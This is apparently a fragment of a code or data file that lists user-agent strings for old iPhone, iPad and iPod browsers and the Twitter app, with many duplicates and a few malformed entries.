    'Mozilla/5.0 (iPad; CPU OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A5313e Safari/7534.48.3',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_0_1 like Mac OS X; fr-fr) AppleWebKit/532.9 (KHTML, like Gecko) Version/4.0.5 Mobile/8A306 Safari/6531.22.7',
    'Mozilla/5.0 (iPad; CPU OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A5313e',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPad',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8F190 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148a Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; ko-kr) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2 Twitter for iPad',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; de-de) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; CPU OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A5313e',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; de-de) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A5313e',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8F191',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A5313e Twitter for iPhone',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_1_3 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7E18 Safari/528.16',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8C148 Twitter for iPhone',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A5313e',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; fr-fr) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_4 like Mac OS X; de-de) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8K2 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_2 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8H7',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8G4 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A5313e',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_6 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8E200',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2 Twitter for iPad',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8F191',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J3',
    'Mozilla/5.0 (iPad; CPU OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A5313e',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; CPU OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A5313e Safari/7534.48.3',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A5313e Safari/7534.48.3',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_2 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8H7',
    'Mozilla/5.0 (iPad; CPU OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A5313e Safari/7534.48.3',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPad',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPhone',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_2 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8H7',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPhone',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; nl-nl) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J3',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8F190 Twitter for iPad',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_0 like Mac OS X; en-us) AppleWebKit/532.9 (KHTML, like Gecko) Version/4.0.5 Mobile/8A293 Safari/6531.22.7',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J3',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; sv-se) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8C148a',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPad',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; de-de) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2',
    'Mozilla/5.0 (iPad; CPU OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A5313e Safari/7534.48.3',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8C148 Twitter for iPhone',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPhone',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8C148',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8C148',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_2 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8H7',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_1_3 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7E18 Safari/528.16',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_0_1 like Mac OS X; en-us) AppleWebKit/532.9 (KHTML, like Gecko) Mobile/8A306',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A5313e Twitter for iPhone',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A5313e',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPad',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A5313e',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; fi-fi) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; fr-fr) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J3 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8G4 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8G4 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8G4 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J3 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A5313e Twitter for iPhone',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8G4 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A5313e Safari/7534.48.3',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPad',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPhone',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) ,AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPhone',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; ko-kr) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_1 like Mac OS X; de-de) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8G4 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8F190',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3',
    'Mozilla/5.0 (iPod; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_0_1 like Mac OS X; en-us) AppleWebKit/532.9 (KHTML, like Gecko) Mobile/8A306',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_10 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8E600 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8G4 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; de-de) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_1_3 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7E18 Safari/528.16',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPhone',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_0_1 like Mac OS X; en-us) AppleWebKit/532.9 (KHTML, like Gecko) Mobile/8A306',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2 Twitter for iPhone',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; nb-no) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J3',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A5313e Safari/7534.48.3',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPhone',
    'Mozilla/5.0 (iPad; U; CPU OS_3_2_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B500 Safari/531.21.10',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; de-de) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J3',
    'Mozilla/5.0 (iPad; CPU OS 4_3 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/8F190 Safari/7534.48.3',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPhone',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_4 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8K2 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J3',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_10 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8E600 Twitter for iPhone',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2 Twitter for iPhone',
    'Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8C148 Twitter for iPad',
    'Mozilla/5.0 (iPad; CPU OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A5313e',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A5313e',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J3',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8G4 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; es-es) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2',
    'Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8C148',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2',
